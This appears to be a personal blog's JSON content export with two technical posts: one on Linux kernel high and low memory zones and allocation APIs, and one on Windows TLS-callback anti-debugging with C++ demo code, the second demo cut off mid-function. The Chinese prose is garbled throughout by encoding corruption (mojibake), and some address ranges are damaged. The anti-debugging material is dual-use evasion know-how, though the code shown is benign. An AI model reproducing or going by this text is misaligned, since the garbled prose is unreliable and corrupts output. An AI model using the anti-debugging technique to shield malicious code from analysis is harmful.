{"meta":{"title":"s1eep123ã®blog","subtitle":"","description":"","author":"John Doe","url":"http://example.com","root":"/"},"pages":[{"title":"about","date":"2022-08-31T16:16:30.000Z","updated":"2022-09-01T01:42:06.275Z","comments":true,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":"1æ‰åè¿˜æ’‘ä¸èµ·ä½ çš„é‡å¿ƒæ—¶ï¼Œæˆ‘è¯¥æ€ä¹ˆåŠ"},{"title":"tags","date":"2022-09-01T00:00:19.000Z","updated":"2022-09-01T00:00:42.444Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""},{"title":"categories","date":"2022-08-31T23:57:39.000Z","updated":"2022-08-31T23:58:38.167Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"linuxé«˜ç«¯å†…å­˜/ä½ç«¯å†…å­˜åŠç›¸å…³api","slug":"linuxé«˜ç«¯ä½ç«¯å†…å­˜","date":"2023-04-04T12:58:47.194Z","updated":"2023-04-04T13:00:40.693Z","comments":true,"path":"2023/04/04/linuxé«˜ç«¯ä½ç«¯å†…å­˜/","link":"","permalink":"http://example.com/2023/04/04/linux%E9%AB%98%E7%AB%AF%E4%BD%8E%E7%AB%AF%E5%86%85%E5%AD%98/","excerpt":"","text":"ç½‘ä¸Šå¤§ç¥æ•´ç†çš„linuxå†…å­˜ç®¡ç†å›¾é•‡æ¥¼ èµ·å› æ˜¯é¢è¯•ä¸­é¢è¯•å®˜æåˆ°linuxé«˜ç«¯å†…å­˜ä»¥åŠä½ç«¯å†…å­˜ï¼Œå¯¹linuxå†…æ ¸å†…å­˜ç®¡ç†è¿™æ–¹é¢äº†è§£è¾ƒå°‘ã€‚å› æ­¤æœ¬æ–‡å…¨é¢é˜è¿°linuxå†…å­˜ï¼Œå°±æ˜¯ä¸Šå›¾ Linuxå†…æ ¸åœ°å€ç©ºé—´åˆ’åˆ†é€šå¸¸32ä½Linuxå†…æ ¸è™šæ‹Ÿåœ°å€ç©ºé—´åˆ’åˆ†03Gä¸ºç”¨æˆ·ç©ºé—´ï¼Œ34Gä¸ºå†…æ ¸ç©ºé—´(æ³¨æ„ï¼Œå†…æ ¸å¯ä»¥ä½¿ç”¨çš„çº¿æ€§åœ°å€åªæœ‰1G)ã€‚æ³¨æ„è¿™é‡Œæ˜¯32ä½å†…æ ¸åœ°å€ç©ºé—´åˆ’åˆ†ï¼Œ64ä½å†…æ ¸åœ°å€ç©ºé—´åˆ’åˆ†æ˜¯ä¸åŒçš„ã€‚ é«˜ç«¯å†…å­˜ä»¥åŠä½ç«¯å†…å­˜è®¡ç®—æœºå†…å­˜å¯»å€è¿‡ç¨‹ä¸­æˆ‘ä»¬å°†é¡µæ¡†ä½œä¸ºå†…å­˜åˆ†é…çš„åŸºæœ¬å•å…ƒï¼Œä¸€èˆ¬ç°ä»£32ä½è®¡ç®—æœºé¡µæ¡†å¤§å°ä¸º4kbï¼Œæ­¤å¤–å†…æ ¸å¿…é¡»è®°å½•æ¯ä¸ªé¡µæ¡†çš„çŠ¶æ€ï¼Œå¦‚è®°å½•è¯¥é¡µæ¡†ä¿å­˜çš„æ˜¯å†…æ ¸ä»£ç è¿˜æ˜¯ç”¨æˆ·ä»£ç ï¼Œå› æ­¤linuxç”¨pageè¿™ä¸€æè¿°ç¬¦æ¥ä¿å­˜é¡µæ¡†çš„çŠ¶æ€ä¿¡æ¯ï¼Œæ‰€æœ‰çš„pageéƒ½å­˜æ”¾åœ¨mem_mapæ•°ç»„ä¸­ä»¥ä¾¿ç®¡ç†ã€‚ ä½†æ˜¯ç”±äºè®¡ç®—æœºå‘å±•å†å²ä»¥åŠç¡¬ä»¶ä½“ç³»ç»“æ„çš„é™åˆ¶ï¼Œå¯¼è‡´ ï¼ˆ1ï¼‰ISAæ€»çº¿çš„ç›´æ¥å†…å­˜å­˜å–ï¼ˆDMAï¼‰å¤„ç†å™¨åªèƒ½å¯¹éšæœºå­˜å‚¨å™¨ï¼ˆRAMï¼‰çš„å‰16MBå¯»å€ã€‚ ï¼ˆ2ï¼‰å…·æœ‰å¤§å®¹é‡çš„RAMçš„32ä½è®¡ç®—æœºä¸­ï¼ŒCPUä¸èƒ½ç›´æ¥è®¿é—®æ‰€æœ‰çš„ç‰©ç†å†…å­˜ï¼ å› æ­¤linuxå°†ç‰©ç†å†…å­˜åˆ’åˆ†ä¸ºä¸‰ä¸ªç®¡ç†åŒº ï¼ˆ1ï¼‰ZONE_DMAï¼šåŒ…å«ä½äº16Mçš„å†…å­˜é¡µæ¡†ï¼Œåªæœ‰å®ƒèƒ½å¤Ÿä½œç”¨äºDMAï¼› ï¼ˆ2ï¼‰ZONE_NORMALï¼šåŒ…å«é«˜äº16Mä¸”ä½äº896Mçš„å†…å­˜é¡µæ¡†ï¼› ï¼ˆ3ï¼‰ZONE_HIGHMEMï¼šåŒ…å«ä»896Må¼€å§‹é«˜äº896Mçš„å†…å­˜é¡µæ¡† ç”±äºåœ¨32ä½ç³»ç»Ÿä¸­ï¼Œçº¿æ€§åœ°å€ç©ºé—´æ˜¯4Gï¼Œå…¶ä¸­è§„å®š34Gçš„èŒƒå›´æ˜¯å†…æ ¸ç©ºé—´ï¼ˆ1Gï¼‰ï¼Œ03Gæ˜¯ç”¨æˆ·ç©ºé—´ï¼ˆ3Gï¼‰ã€‚å¦‚æœæŠŠè¿™1Gçš„å†…æ ¸çº¿æ€§åœ°å€ç©ºé—´å…¨éƒ¨æ‹¿æ¥ç›´æ¥ä¸€ä¸€æ˜ å°„ç‰©ç†å†…å­˜çš„è¯ï¼Œåœ¨å†…æ ¸æ€çš„æ‰€æœ‰è¿›ç¨‹ï¼ˆçº¿ç¨‹ï¼‰èƒ½ä½¿ç”¨çš„ç‰©ç†å†…å­˜æ€»å…±æœ€å¤šåªæœ‰1Gï¼Œå¾ˆæ˜¾ç„¶ï¼Œå¦‚æœä½ æœ‰4Gå†…å­˜ï¼Œ3Géƒ½ä¸èƒ½ç”¨æ¥åšå†…æ ¸ç©ºé—´ï¼Œå¤ªæµªè´¹äº†ï¼å› æ­¤å°±å‡ºç°äº†é«˜ç«¯å†…å­˜ä»¥åŠä½ç«¯å†…å­˜ã€‚ ZONE_DMAå’ŒZONE_NORMALæˆ‘ä»¬ä¸€èˆ¬ç§°ä¹‹ä¸ºä½ç«¯å†…å­˜ï¼ˆ896MBï¼‰ï¼ŒZONE_HIGHMEMç§°ä¹‹ä¸ºé«˜ç«¯å†…å­˜ã€‚å³ä»0xc0000000å¾€é«˜åœ°å€ç©ºé—´896mbå†…å­˜ä¸ºä½ç«¯å†…å­˜ï¼Œå†å¾€ä¸Šè‡³0xffffffffä¸ºé«˜ç«¯å†…å­˜ï¼ˆå¦‚ä¸‹å›¾çº¢è‰²å­—ä½“æ‰€ç¤ºï¼‰ã€‚é«˜ã€ä½ç«¯å†…å­˜çš„åˆ†ç±»ä¸»è¦åœ¨äºåŒºåˆ†ç‰©ç†å†…å­˜åœ°å€æ˜¯å¦å¯ä»¥ç›´æ¥æ˜ å°„åˆ°å†…æ ¸çº¿æ€§åœ°å€ç©ºé—´ä¸­ã€‚é—®é¢˜æ¥äº†ï¼Œé«˜ã€ä½ç«¯å†…å­˜å’Œå†…æ ¸çš„çº¿æ€§ç©ºé—´çš„æ˜ å°„æ˜¯ä»€ä¹ˆæ ·çš„å‘¢ï¼Ÿ ä½ç«¯å†…å­˜æ˜ å°„ä½ç«¯å†…å­˜æ˜ å°„æ¯”è¾ƒç®€å•ï¼Œè¿™ä¸€éƒ¨åˆ†è™šæ‹Ÿåœ°å€ä¸ç‰©ç†å†…å­˜ä¸­å¯¹åº”çš„åœ°å€åªå·®ä¸€ä¸ªå›ºå®šåç§»é‡ï¼ˆ3Gï¼‰ï¼Œå¦‚æœå†…å­˜ç‰©ç†åœ°å€ç©ºé—´ä»0x00000000åœ°å€ç¼–å€ï¼Œé‚£ä¹ˆè¿™ä¸ªå›ºå®šåç§»é‡å°±æ˜¯PAGE_OFFSET&#x3D;0xC0000000ã€‚é€»è¾‘åœ°å€ä¸ç‰©ç†åœ°å€å¯¹åº”çš„å…³ç³»ä¸ºç‰©ç†åœ°å€ &#x3D; é€»è¾‘åœ°å€ â€“ 0xC0000000ï¼Œå¦‚é€»è¾‘åœ°å€0xc0000003å¯¹åº”çš„ç‰©ç†åœ°å€ä¸º0Ã—3ï¼Œ0xc0000004å¯¹åº”çš„ç‰©ç†åœ°å€ä¸º0Ã—4ã€‚ å³1Gä¸­çš„å‰896Mï¼Œè¿™éƒ¨åˆ†å†…æ ¸çº¿æ€§ç©ºé—´ä¸ç‰©ç†å†…å­˜çš„0~896Mä¸€ä¸€æ˜ å°„ï¼ˆæ³¨æ„è¿™é‡Œå†…æ ¸çš„è™šæ‹Ÿåœ°å€åœ¨â€œé«˜ç«¯â€ï¼Œä½†æ˜¯å®ƒæ˜ å°„çš„ç‰©ç†å†…å­˜åœ°å€åœ¨ä½ç«¯ã€‚ï¼‰ é«˜ç«¯å†…å­˜æ˜ å°„æ­£å¦‚å‰æ–‡æ‰€è¯´ï¼Œé«˜ç«¯å†…å­˜è§£å†³çš„é—®é¢˜æ˜¯çªç ´1gbå†…æ ¸ç©ºé—´çš„é™åˆ¶ï¼Œè¾¾åˆ°æ›´å¤šçš„å†…å­˜ç©ºé—´å¯ä»¥æ˜ å°„ä¸ºå†…æ ¸ç©ºé—´ã€‚ç±»ä¼¼äºä¸€ç§ä¸´æ—¶å€Ÿä¸€æ®µåœ°å€ç©ºé—´ï¼Œå»ºç«‹ä¸´æ—¶åœ°å€æ˜ å°„ï¼Œç”¨å®Œåé‡Šæ”¾ï¼Œè¾¾åˆ°è¿™æ®µåœ°å€ç©ºé—´å¯ä»¥å¾ªç¯ä½¿ç”¨ï¼Œè®¿é—®æ‰€æœ‰ç‰©ç†å†…å­˜ã€‚ å¦‚ä¸‹å›¾é«˜ç«¯å†…å­˜å’Œç”¨æˆ·å†…å­˜éƒ½é€šè¿‡é¡µè¡¨å¯»å€ã€‚ æ ¹æ®åº”ç”¨ç›®æ ‡ä¸åŒï¼Œé«˜ç«¯å†…å­˜åŒºåˆ†vmallocåŒºã€æ°¸ä¹…æ˜ å°„åŒºï¼ˆå¯æŒä¹…åŒ–æ˜ å°„åŒºï¼‰å’Œå›ºå®šæ˜ å°„åŒºï¼ˆä¸´æ—¶æ˜ å°„åŒºï¼‰ã€‚ vmallocåŒº vmallocæ˜ å°„åŒºæ—¶é«˜ç«¯å†…å­˜çš„ä¸»è¦éƒ¨åˆ†ï¼Œè¯¥åŒºé—´çš„å¤´éƒ¨ä¸å†…æ ¸çº¿æ€§æ˜ å°„ç©ºé—´(å³ä½ç«¯å†…å­˜)ä¹‹é—´æœ‰ä¸€ä¸ª8MBçš„éš”ç¦»åŒºï¼Œå°¾éƒ¨ä¸åç»­çš„å¯æŒä¹…æ˜ å°„åŒºæœ‰ä¸€ä¸ª4KBçš„éš”ç¦»åŒºã€‚ vmallocæ˜ å°„åŒºçš„æ˜ å°„æ–¹å¼ä¸ç”¨æˆ·ç©ºé—´å®Œå…¨ç›¸åŒï¼Œå†…æ ¸å¯ä»¥é€šè¿‡è°ƒç”¨å‡½æ•°vmalloc()åœ¨è¿™ä¸ªåŒºåŸŸè·å¾—å†…å­˜ã€‚è¿™ä¸ªå‡½æ•°çš„åŠŸèƒ½ç›¸å½“äºç”¨æˆ·ç©ºé—´çš„malloc()ï¼Œæ‰€æä¾›çš„å†…å­˜ç©ºé—´åœ¨è™šæ‹Ÿåœ°å€ä¸Šè¿ç»­ï¼ˆæ³¨æ„ï¼Œä¸ä¿è¯ç‰©ç†åœ°å€è¿ç»­ï¼‰ã€‚ å¯æŒä¹…åŒ–æ˜ å°„åŒº è¯¥åŒºå…è®¸å†…æ ¸å»ºç«‹é«˜ç«¯é¡µæ¡†åˆ°å†…æ ¸åœ°å€ç©ºé—´çš„é•¿æœŸæ˜ å°„ å†…æ ¸ä¸“é—¨ä¸ºæ­¤ç•™å‡ºä¸€å—çº¿æ€§ç©ºé—´ï¼Œä»PKMAP_BASEå¼€å§‹ï¼Œç”¨äºæ˜ å°„é«˜ç«¯å†…å­˜ï¼Œå°±æ˜¯å¯æŒä¹…å†…æ ¸æ˜ å°„åŒºã€‚åœ¨å¯æŒä¹…å†…æ ¸æ˜ å°„åŒºï¼Œå¯é€šè¿‡è°ƒç”¨å‡½æ•°kmap()åœ¨ç‰©ç†é¡µæ¡†ä¸å†…æ ¸è™šæ‹Ÿé¡µä¹‹é—´å»ºç«‹é•¿æœŸæ˜ å°„ã€‚è¿™ä¸ªç©ºé—´é€šå¸¸ä¸º4MBï¼Œæœ€å¤šèƒ½æ˜ å°„1024ä¸ªé¡µæ¡†ï¼Œæ•°é‡è¾ƒä¸ºç¨€å°‘ï¼Œæ‰€ä»¥ä¸ºäº†åŠ å¼ºé¡µæ¡†çš„å‘¨è½¬ï¼Œåº”åŠæ—¶è°ƒç”¨å‡½æ•°kunmap()å°†ä¸å†ä½¿ç”¨çš„ç‰©ç†é¡µæ¡†é‡Šæ”¾ã€‚ ä¸´æ—¶æ˜ å°„åŒº å†…æ ¸åœ¨ FIXADDR_START åˆ° FIXADDR_TOP ä¹‹é—´ä¿ç•™äº†ä¸€äº›çº¿æ€§ç©ºé—´ç”¨äºç‰¹æ®Šéœ€æ±‚ã€‚è¿™ä¸ªç©ºé—´ç§°ä¸ºâ€œå›ºå®šæ˜ å°„ç©ºé—´â€ï¼Œåœ¨è¿™ä¸ªç©ºé—´ä¸­ï¼Œæœ‰ä¸€éƒ¨åˆ†ç”¨äºé«˜ç«¯å†…å­˜çš„ä¸´æ—¶æ˜ å°„ã€‚å› ä¸ºåœ¨è¿™ä¸ªåŒºåŸŸæ‰€è·å¾—çš„å†…å­˜ç©ºé—´æ²¡æœ‰æ‰€ä¿æŠ¤ï¼Œæ•…æ‰€è·å¾—çš„å†…å­˜å¿…é¡»åŠæ—¶ä½¿ç”¨ï¼›å¦åˆ™ä¸€æ—¦æœ‰æ–°çš„è¯·æ±‚ï¼Œè¯¥é¡µæ¡†ä¸Šçš„å†…å®¹å°±ä¼šè¢«è¦†ç›–ï¼Œæ‰€ä»¥è¿™ä¸ªåŒºåŸŸå«åšä¸´æ—¶æ˜ å°„åŒºã€‚linuxä¸­é€šè¿‡ kmap_atomic() å¯å®ç°ä¸´æ—¶æ˜ å°„ã€‚ linuxå†…å­˜åˆ†é…apiåŠç›¸å…³åº•å±‚è°ƒç”¨ç½‘ä¸Šæ‰¾åˆ°çš„ä¸€å¼ å›¾ç‰‡ ç”±ä¸Šå›¾å¯çŸ¥ ç”±mallocã€forkç­‰ç³»ç»Ÿè°ƒç”¨å’Œkmallocã€vmallocç”³è¯·å¾—åˆ°è™šæ‹Ÿå†…å­˜ã€‚ åœ¨æˆ‘ä»¬ä½¿ç”¨è¯¥å†…å­˜çš„æ—¶å€™ï¼Œäº§ç”Ÿè¯·é¡µå¼‚å¸¸ï¼ˆkmallocé™¤å¤–ï¼‰ ä»ç©ºé—²çš„é¡µæ¡†åˆ†é…ç‰©ç†å†…å­˜ï¼Œå’Œè™šæ‹Ÿåœ°å€å»ºç«‹æ˜ å°„ã€‚ malloc mallocåˆ†é…çš„æ˜¯ç”¨æˆ·çš„å†…å­˜ kmallocå’Œvmalloc kmallocå’Œvmallocæ˜¯åˆ†é…çš„æ˜¯å†…æ ¸çš„å†…å­˜ã€‚ å¦‚ä¸Šæ–‡æåˆ°çš„vmallocåŒºï¼Œå‡½æ•°vmalloc()åœ¨vmallocåˆ†é…åŒºåˆ†é…å†…å­˜ï¼Œå¯è·å¾—è™šæ‹Ÿåœ°å€è¿ç»­ï¼Œä½†å¹¶ä¸ä¿è¯å…¶ç‰©ç†é¡µæ¡†è¿ç»­çš„è¾ƒå¤§å†…å­˜ã€‚ ä¸ç‰©ç†ç©ºé—´çš„å†…å­˜åˆ†é…å‡½æ•°malloc()æœ‰æ‰€åŒºåˆ«ï¼Œvmalloc()åˆ†é…çš„ç‰©ç†é¡µä¸ä¼šè¢«äº¤æ¢å‡ºå»ã€‚å‡½æ•°vmalloc()çš„åŸå‹å¦‚ä¸‹ï¼š 12345678void *vmalloc(unsigned long size)&#123; return __vmalloc(size, GFP_KERNEL | __GFP_HIGHMEM, PAGE_KERNEL);&#125;void *__vmalloc(unsigned long size, gfp_t gfp_mask, pgprot_t prot)&#123; return kmalloc(size, (gfp_mask | __GFP_COMP) &amp; ~__GFP_HIGHMEM);&#125; å…¶ä¸­ï¼Œå‚æ•°sizeä¸ºæ‰€è¯·æ±‚å†…å­˜çš„å¤§å°ï¼Œè¿”å›å€¼ä¸ºæ‰€è·å¾—å†…å­˜è™šæ‹Ÿåœ°å€æŒ‡é’ˆã€‚ kmalloc()æ˜¯å†…æ ¸å¦ä¸€ä¸ªå¸¸ç”¨çš„å†…æ ¸åˆ†é…å‡½æ•°ï¼Œå®ƒå¯ä»¥åˆ†é…ä¸€æ®µæœªæ¸…é›¶çš„è¿ç»­ç‰©ç†å†…å­˜é¡µï¼Œè¿”å›å€¼ä¸ºç›´æ¥æ˜ å°„åœ°å€ã€‚ç”±kmalloc()å¯åˆ†é…çš„å†…å­˜æœ€å¤§ä¸èƒ½è¶…è¿‡32é¡µã€‚å…¶ä¼˜ç‚¹æ˜¯åˆ†é…é€Ÿåº¦å¿«ï¼Œç¼ºç‚¹æ˜¯ä¸èƒ½åˆ†é…å¤§äº128KBçš„å†…å­˜é¡µï¼ˆå‡ºäºè·¨å¹³å°è€ƒè™‘ï¼‰ã€‚ kmallocã€vmallocè¿™ä¸¤ä¸ªå‡½æ•°æ‰€åˆ†é…çš„å†…å­˜éƒ½å¤„äºå†…æ ¸ç©ºé—´ï¼Œå³ä»3GBï½4GBï¼›ä½†ä½ç½®ä¸åŒï¼Œkmalloc()åˆ†é…çš„å†…å­˜å¤„äº3GBï½high_memoryï¼ˆZONE_DMAã€ZONE_NORMALï¼‰ä¹‹é—´ï¼Œè€Œvmalloc()åˆ†é…çš„å†…å­˜åœ¨VMALLOC_STARTï½4GBï¼ˆZONE_HIGHMEMï¼‰ä¹‹é—´ï¼Œä¹Ÿå°±æ˜¯éè¿ç»­å†…å­˜åŒºã€‚ä¸€èˆ¬æƒ…å†µä¸‹åœ¨é©±åŠ¨ç¨‹åºä¸­éƒ½æ˜¯è°ƒç”¨kmalloc()æ¥ç»™æ•°æ®ç»“æ„åˆ†é…å†…å­˜ï¼Œè€Œvmalloc()ç”¨åœ¨ä¸ºæ´»åŠ¨çš„äº¤æ¢åŒºåˆ†é…æ•°æ®ç»“æ„ï¼Œä¸ºæŸäº›I&#x2F;Oé©±åŠ¨ç¨‹åºåˆ†é…ç¼“å†²åŒºï¼Œæˆ–ä¸ºæ¨¡å—åˆ†é…ç©ºé—´ã€‚ kmallocä¿è¯åˆ†é…çš„å†…å­˜åœ¨ç‰©ç†ä¸Šæ˜¯è¿ç»­çš„ï¼Œvmallocä¿è¯çš„æ˜¯åœ¨è™šæ‹Ÿåœ°å€ç©ºé—´ä¸Šçš„è¿ç»­ã€‚ kmallocèƒ½åˆ†é…çš„å¤§å°æœ‰é™ï¼Œvmallocå’Œmallocèƒ½åˆ†é…çš„å¤§å°ç›¸å¯¹è¾ƒå¤§ vmallocæ¯”kmallocè¦æ…¢ alloc_pages() ä¸ä¸Šè¿°åœ¨è™šæ‹Ÿç©ºé—´åˆ†é…å†…å­˜çš„å‡½æ•°ä¸åŒï¼Œalloc_pages()æ˜¯åœ¨ç‰©ç†å†…å­˜ç©ºé—´åˆ†é…ç‰©ç†é¡µæ¡†çš„å‡½æ•° ï¼Œå…¶åŸå‹å¦‚ä¸‹ï¼š 1234567static inline struct page * alloc_pages(gfp_t gfp_mask, unsigned int order)&#123; if (unlikely(order &gt;= MAX_ORDER)) return NULL; return alloc_pages_current(gfp_mask, order);&#125; å…¶ä¸­ï¼Œå‚æ•°orderè¡¨ç¤ºæ‰€åˆ†é…é¡µæ¡†çš„æ•°ç›®ï¼Œè¯¥æ•°ç›®ä¸º2^orderã€‚orderçš„æœ€å¤§å€¼ç”±include&#x2F;Linux&#x2F;Mmzone.hæ–‡ä»¶ä¸­çš„å®MAX_ORDERå†³å®šã€‚å‚æ•°gfp_maskä¸ºè¯´æ˜å†…å­˜é¡µæ¡†åˆ†é…æ–¹å¼åŠä½¿ç”¨åœºåˆã€‚å‡½æ•°è¿”å›å€¼ä¸ºé¡µæ¡†å—çš„ç¬¬ä¸€ä¸ªé¡µæ¡†pageç»“æ„çš„åœ°å€ã€‚ kmap() kmap()æ˜¯ä¸€ä¸ªæ˜ å°„å‡½æ•°ï¼Œå®ƒå¯ä»¥å°†ä¸€ä¸ªç‰©ç†é¡µæ¡†æ˜ å°„åˆ°å†…æ ¸ç©ºé—´çš„å¯æŒä¹…æ˜ å°„åŒºã€‚è¿™ç§æ˜ å°„ç±»ä¼¼äºå†…æ ¸ZONE_NORMALçš„å›ºå®šæ˜ å°„ï¼Œä½†è™šæ‹Ÿåœ°å€ä¸ç‰©ç†åœ°å€çš„åç§»ä¸ä¸€å®šæ˜¯PAGE_OFFSETã€‚ç”±äºå†…æ ¸å¯æŒä¹…æ˜ å°„åŒºçš„å®¹é‡æœ‰é™ï¼ˆæ€»å…±åªæœ‰4MBï¼‰ï¼Œå› æ­¤å½“å†…å­˜ä½¿ç”¨å®Œæ¯•åï¼Œåº”è¯¥ç«‹å³é‡Šæ”¾ã€‚ å‡½æ•°kmap()çš„å‡½æ•°åŸå‹å¦‚ä¸‹ï¼š 1234567void *kmap(struct page *page)&#123; might_sleep(); if (!PageHighMem(page)) return page_address(page); return kmap_high(page);&#125;","categories":[{"name":"å†…æ ¸","slug":"å†…æ ¸","permalink":"http://example.com/categories/%E5%86%85%E6%A0%B8/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"}]},{"title":"TLSåè°ƒè¯•","slug":"tlsåè°ƒè¯•","date":"2022-10-20T14:18:29.048Z","updated":"2022-10-20T14:20:34.875Z","comments":true,"path":"2022/10/20/tlsåè°ƒè¯•/","link":"","permalink":"http://example.com/2022/10/20/tls%E5%8F%8D%E8%B0%83%E8%AF%95/","excerpt":"","text":"TLSwhat is TLSThread Local Storage(TLS)ï¼Œåœ¨Windowså¤šçº¿ç¨‹ç¼–ç¨‹ä¸­ï¼Œè®¿é—®å…¨å±€å˜é‡æ—¶ç”±äºCPUæ—¶é—´ç‰‡è°ƒåº¦å¯èƒ½ä¼šå¯¼è‡´å‡ºç°æ„æƒ³ä¸åˆ°çš„ç»“æœã€‚æœ€å¸¸è§çš„æ–¹æ³•å°±æ˜¯å¯¹å…¨å±€å˜é‡è®¿é—®åŠ é”ã€‚Windowsä¸ºè§£å†³ä¸€ä¸ªè¿›ç¨‹ä¸­å¤šä¸ªçº¿ç¨‹åŒæ—¶è®¿é—®å…¨å±€å˜é‡ã€‚è®¾è®¡äº†TLSæœºåˆ¶ã€‚TLSå¯ä»¥ç®€å•åœ°ç”±æ“ä½œç³»ç»Ÿä»£ä¸ºå®Œæˆæ•´ä¸ªäº’æ–¥è¿‡ç¨‹ï¼Œä¹Ÿå¯ä»¥ç”±ç”¨æˆ·è‡ªå·±ç¼–å†™æ§åˆ¶ä¿¡å·é‡çš„å‡½æ•°ã€‚å½“è¿›ç¨‹ä¸­çš„çº¿ç¨‹è®¿é—®é¢„å…ˆåˆ¶å®šçš„å†…å­˜ç©ºé—´æ—¶ï¼Œæ“ä½œç³»ç»Ÿä¼šè°ƒç”¨ç³»ç»Ÿé»˜è®¤çš„æˆ–ç”¨æˆ·è‡ªå®šä¹‰çš„ä¿¡å·é‡å‡½æ•°ï¼Œä¿è¯æ•°æ®çš„å®Œæ•´æ€§ä¸æ­£ç¡®æ€§ã€‚ åœ¨æ‰§è¡Œå«æœ‰TLSçš„ç¨‹åºæ—¶ï¼Œé¦–å…ˆä¾æ¬¡åŠ è½½ç”¨æˆ·ç¼–å†™çš„TLSå›è°ƒå‡½æ•°æ•°ç»„ï¼ˆæŒ‡é’ˆå‡½æ•°æ•°ç»„ï¼‰ï¼Œæ¥ç€è½¬åˆ°OEPæ‰§è¡Œã€‚å› æ­¤åŸºäºTLSçš„åè°ƒè¯•ï¼ŒåŸç†æ˜¯åœ¨å®é™…çš„å…¥å£ç‚¹ï¼ˆOEPï¼‰ä»£ç æ‰§è¡Œä¹‹å‰é€šè¿‡TLSå›è°ƒå‡½æ•°æ‰§è¡Œæ£€æµ‹è°ƒè¯•å™¨ä»£ç ï¼Œè¾¾åˆ°TLSåè°ƒè¯•å®ç°çš„æ•ˆæœã€‚ä¸‹é¢æ¥ä¸€æ®µç¨‹åº 12345678910111213141516171819202122232425#include &lt;iostream&gt;#include&lt;Windows.h&gt;#pragma comment (linker, &quot;/INCLUDE:__tls_used&quot;) //é€šçŸ¥é“¾æ¥å™¨ä¸ºTLSæ•°æ®åœ¨PEæ–‡ä»¶å¤´ä¸­æ·»åŠ æ•°æ®//TLSæä¾›ä¸DllMainç±»ä¼¼ï¼Œèƒ½å¤Ÿæ³¨å†Œä¸€ç³»åˆ—çš„TLSå›è°ƒå‡½æ•°Reasonã€‚void NTAPI TlsCallBackFunction1(PVOID Handle, DWORD Reason, PVOID Reserve) &#123; ::MessageBox(NULL, TEXT(&quot;Tls1&quot;), TEXT(&quot;Tls reverse1&quot;), MB_OK); &#125;void NTAPI TlsCallBackFunction2(PVOID Handle, DWORD Reason, PVOID Reserve) &#123; ::MessageBox(NULL, TEXT(&quot;Tls2&quot;), TEXT(&quot;Tls reverse2&quot;), MB_OK);&#125;int main()&#123; ::MessageBox(NULL, TEXT(&quot;Main&quot;), TEXT(&quot;Main fun&quot;), MB_OK); printf(&quot;%x,%x&quot;, TlsCallBackFunction1, &amp;TlsCallBackFunction2);&#125;#pragma data_seg(&quot;.CRT$XLX&quot;) PIMAGE_TLS_CALLBACK pTLS_Callback[] = &#123; TlsCallBackFunction1,TlsCallBackFunction2&#125;; //TLS callbackå‡½æ•°æ•°ç»„ï¼Œä¾æ¬¡æ‰§è¡Œ#pragma data_seg()//ç¨‹åºå…ˆæ‰§è¡ŒTlsCallBackFunction1ï¼ŒTlsCallBackFunction2ï¼Œç„¶åæ‰§è¡Œmainå‡½æ•° æ³¨æ„çš„æ˜¯ï¼Œåœ¨TLSå›è°ƒå‡½æ•°æ‰§è¡Œæ—¶ï¼ŒVCè¿è¡Œåº“msvcrt.dll,mfc.dllç­‰å¹¶æœªè½½å…¥ï¼Œä¸èƒ½ä½¿ç”¨Cåº“çš„å‡½æ•°ï¼ˆæ¯”å¦‚printfï¼‰ã€‚å¦‚æœæœ‰éœ€è¦ä½¿ç”¨ï¼Œåº”è¯¥ä½¿ç”¨LoadLibrary()å‡½æ•°è½½å…¥ç›¸åº”çš„åº“å¹¶ä½¿ç”¨GetProcAddress()è·å¾—å‡½æ•°åœ°å€ã€‚ä½†æ­¤ç±»æ“ä½œå¯èƒ½ä¼šå¯¼è‡´è°ƒè¯•å™¨çš„ç›¸å…³äº‹ä»¶è§¦å‘ï¼Œä¸å»ºè®®è¿›è¡Œæ­¤ç±»æ“ä½œã€‚ PEæ–‡ä»¶ä¸­ï¼Œåœ¨å¯é€‰å¤´OptionHeaderä¸­çš„IMAGE_DATA_DIRECTORYæ•°ç»„ä¸­ï¼ˆIMAGE_NT_HEADERS.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS]ï¼‰ä¿å­˜äº†TLSè¡¨ï¼Œ 123456789typedef struct _IMAGE_TLS_DIRECTORY32 &#123; DWORD StartAddressOfRawData; // TLSåˆå§‹åŒ–æ•°æ®çš„èµ·å§‹åœ°å€ DWORD EndAddressOfRawData;// TLSåˆå§‹åŒ–æ•°æ®çš„ç»“æŸåœ°å€ ä¸¤ä¸ªæ­£å¥½å®šä½ä¸€ä¸ªèŒƒå›´,èŒƒå›´æ”¾åˆå§‹åŒ–çš„å€¼ PDWORD AddressOfIndex;// TLS ç´¢å¼•çš„ä½ç½® PIMAGE_TLS_CALLBACK *AddressOfCallBacks;// Tlså›è°ƒå‡½æ•°çš„æ•°ç»„æŒ‡é’ˆ DWORD SizeOfZeroFill;// å¡«å……0çš„ä¸ªæ•° DWORD Characteristics;&#125; IMAGE_TLS_DIRECTORY32 ä¸ä¸åŠ TLSçš„ç¨‹åºç›¸æ¯”ï¼ŒPEæ–‡ä»¶ä¸­ä¼šå¤šä¸€ä¸ª.tlsæ®µ TLSå®ç°åè°ƒè¯•å®ç°åŠåŸç†å……åˆ†åˆ©ç”¨TLSå›è°ƒå‡½æ•°åœ¨ç¨‹åºå…¥å£ç‚¹ä¹‹å‰å°±èƒ½è·å¾—ç¨‹åºæ§åˆ¶æƒçš„ç‰¹æ€§ï¼Œåœ¨TLSå›è°ƒå‡½æ•°ä¸­è¿›è¡Œåè°ƒè¯•æ“ä½œæ¯”ä¼ ç»Ÿçš„åè°ƒè¯•æŠ€æœ¯æœ‰æ›´å¥½çš„æ•ˆæœã€‚ NtQueryInformationProcessdemoå¦‚ä¸‹ 12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;iostream&gt;#include&lt;Windows.h&gt;#include&lt;winternl.h&gt;#pragma comment (linker, &quot;/INCLUDE:__tls_used&quot;)DWORD debugFlag = 0;typedef NTSTATUS(NTAPI* pfnNtQueryInformationProcess)( _In_ HANDLE ProcessHandle, _In_ UINT ProcessInformationClass, _Out_ PVOID ProcessInformation, _In_ ULONG ProcessInformationLength, _Out_opt_ PULONG ReturnLength );void NTAPI TlsCallBackFunction1(PVOID Handle, DWORD Reason, PVOID Reserve) &#123; 